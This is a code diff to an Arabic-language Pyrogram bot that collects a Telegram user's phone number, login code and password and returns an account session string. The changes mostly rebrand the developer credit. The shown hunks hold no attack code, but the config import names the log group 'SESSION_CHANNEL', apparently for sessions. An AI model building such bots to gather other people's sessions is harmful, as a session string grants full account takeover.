@@ -1,4 +1,4 @@
-# Join ne on telegram @devggn
+# Join ne on telegram @u_t_r
 import os
 from pyrogram import Client, filters
 from pyrogram.errors import (
@@ -11,6 +11,10 @@ from pyrogram.errors import (
 )
 import asyncio
 from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN
+
+# ====== معلومات المطور ======
+DEV_NAME = "عبود"
+DEV_USERNAME = "@u_t_r"
 
 user_steps = {}
 user_data = {}
@@ -34,10 +38,12 @@ def delete_session_files(user_id):
 @app.on_message(filters.command("start"))
 async def start_command(client, message):
     await message.reply(
-        "👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
+        f"👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
         "📌 **للاستخدام:**\n"
         "• أرسل `توليد` لبدء استخراج جلسة جديدة.\n"
-        "• أرسل `مسح` لمسح بيانات الجلسة المحفوظة.\n\n"
+        "• أرسل `مسح` لمسح بيانات الجلسة المحفوظة.\n"
+        "• أرسل `المطور` لعرض معلومات المطور.\n\n"
+        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n\n"
         "⚡ **مدعوم من Team SPY**"
     )
 
@@ -58,6 +64,16 @@ async def handle_arabic_commands(client, message):
         await message.reply("✅ **تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.**")
         return
     
+    # أمر المطور
+    elif text == "المطور":
+        await message.reply(
+            f"👨‍💻 **معلومات المطور:**\n\n"
+            f"📛 **الاسم:** {DEV_NAME}\n"
+            f"🔗 **اليوزر:** {DEV_USERNAME}\n\n"
+            "⚡ **مدعوم من Team SPY**"
+        )
+        return
+    
     # إذا كان المستخدم في خطوة معينة (رقم هاتف، OTP، كلمة مرور)
     elif user_id in user_steps:
         await session_step(client, message)
@@ -70,7 +86,8 @@ async def handle_arabic_commands(client, message):
             "مثال: `+966512345678`\n\n"
             "أو استخدم الأوامر:\n"
             "• `توليد` لبدء استخراج جلسة جديدة\n"
-            "• `مسح` لمسح البيانات"
+            "• `مسح` لمسح البيانات\n"
+            "• `المطور` لعرض معلومات المطور"
         )
         user_steps[user_id] = "phone_number"
 
@@ -110,6 +127,7 @@ async def session_step(client, message):
                 f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
                 "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n"
                 "نحن لسنا مسؤولين عن أي سوء استخدام.\n\n"
+                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n\n"
                 "⚡ **مدعوم من Team SPY**"
             )
             
@@ -142,6 +160,7 @@ async def session_step(client, message):
                 f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
                 "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n"
                 "نحن لسنا مسؤولين عن أي سوء استخدام.\n\n"
+                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n\n"
                 "⚡ **مدعوم من Team SPY**"
             )
             
